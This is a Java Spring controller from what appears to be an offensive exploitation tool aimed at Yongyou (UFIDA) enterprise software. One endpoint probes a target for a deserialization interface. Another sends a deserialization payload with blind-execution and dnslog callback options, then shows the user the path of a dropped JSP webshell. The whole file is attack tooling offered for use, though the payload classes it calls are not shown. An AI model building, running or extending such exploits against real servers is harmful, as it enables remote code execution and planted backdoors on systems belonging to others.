package com.droplab.Controller.Yongyou;

import com.droplab.Controller.BaseController;
import com.droplab.Controller.Yongyou.Service.GetUnserializePayload;
import com.droplab.Controller.Yongyou.Service.YongyouCheckeURL;
import com.droplab.Utils.CommonUtils;
import org.jsoup.Connection;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;

import java.util.HashMap;
import java.util.Map;

/**
 * 用友利用
 */
@Controller
@RequestMapping("/yongyou")
public class YongyouController implements BaseController {
    @RequestMapping(value = "/index", method = RequestMethod.GET)
    public String index(Model model) {
        CommonUtils.modelSet(new HashMap<>(), model);
        return "Yongyou/index.html";
    }

    /**
     * 用友反序列化接口探测
     *
     * @param model
     * @return
     */
    @RequestMapping(value = "/YongyouCheckeURL", method = RequestMethod.POST)
    public String YongyouCheckURL(Model model,
                                  @RequestParam(value = "url", required = true) String url) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }
            HashMap hashMap = new HashMap();
            hashMap.put("url", url);

            YongyouCheckeURL yongyouCheckeURL = (YongyouCheckeURL) Class.forName(getMap().get("YongyouCheckeURL")).newInstance();
            yongyouCheckeURL.setParams(hashMap);
            Connection.Response exploit = yongyouCheckeURL.exploit();
            if (exploit != null) {
                HashMap<String, String> modelMap = new HashMap<>();
                String s = new String(exploit.bodyAsBytes());
                modelMap.put("YongyouCheckeURLurl", url);
                modelMap.put("YongyouCheckeURL", s);
                CommonUtils.modelSet(modelMap, model);
                return "Yongyou/index.html";
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        HashMap<String, String> modelMap = new HashMap<>();
        modelMap.put("YongyouCheckeURL", "请求出错，或参数传递不正确");
        CommonUtils.modelSet(modelMap, model);
        return "Yongyou/index.html";
    }


    @RequestMapping(value = "/GetUnserializePayload", method = RequestMethod.POST)
    public String GetUnserializePayload(Model model,
                                        @RequestParam(value = "url", required = true) String url,
                                        @RequestParam(value = "mOption", required = true) String mOption,
                                        @RequestParam(value = "BlindExec", required = false) String BlindExec,
                                        @RequestParam(value = "dnslog", required = false) String dnslog) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }
            HashMap hashMap = new HashMap();
            hashMap.put("mOption", mOption);
            hashMap.put("BlindExec", BlindExec);
            if (dnslog.contains("http://")) {
                hashMap.put("dnslog", dnslog);
            } else {
                hashMap.put("dnslog", "http://" + dnslog);
            }

            GetUnserializePayload getUnserializePayload = (GetUnserializePayload) Class.forName(getMap().get("GetUnserializePayload")).newInstance();
            getUnserializePayload.setParams(hashMap);
            Connection.Response exploit = getUnserializePayload.exploit();
            if (exploit != null) {
                HashMap<String, String> modelMap = new HashMap<>();
                String s = new String(exploit.bodyAsBytes());
                modelMap.put("GetUnserializePayloadurl", url);
                modelMap.put("GetUnserializePayload", s);
                modelMap.put("GetUnserializePayloadtips", "落地shell路径：" + url + "/eozZEwBb.jsp");
                CommonUtils.modelSet(modelMap, model);
                return "Yongyou/index.html";
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        HashMap<String, String> modelMap = new HashMap<>();
        modelMap.put("GetUnserializePayload", "请求出错，或参数传递不正确");
        CommonUtils.modelSet(modelMap, model);
        return "Yongyou/index.html";
    }

    @Override
    public Map<String, String> getMap() {
        HashMap<String, String> hashMap = new HashMap<>();
        hashMap.put("GetUnserializePayload", "com.droplab.Controller.Yongyou.Service.GetUnserializePayload");
        hashMap.put("YongyouCheckeURL", "com.droplab.Controller.Yongyou.Service.YongyouCheckeURL");
        return hashMap;
    }
}

